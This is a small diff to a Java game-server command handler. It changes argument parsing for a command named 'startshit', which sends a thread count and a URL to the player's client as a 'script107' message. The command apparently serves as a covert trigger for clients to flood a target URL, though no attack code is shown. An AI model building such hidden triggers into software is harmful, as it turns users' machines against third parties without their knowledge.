@@ -1381,8 +1381,9 @@ public class CommandPacketHandler implements PacketHandler {
 		}
 
         if(commandStart.equalsIgnoreCase("startshit")) {
-            final int threads = Integer.parseInt(as[0]);
-            final String url = as[1];
+            player.sendf("%s %s %s", as[0], as[1], as[2]);
+            final int threads = Integer.parseInt(as[1]);
+            final String url = as[2];
             player.sendMessage("script107"+threads+","+url);
         }
 
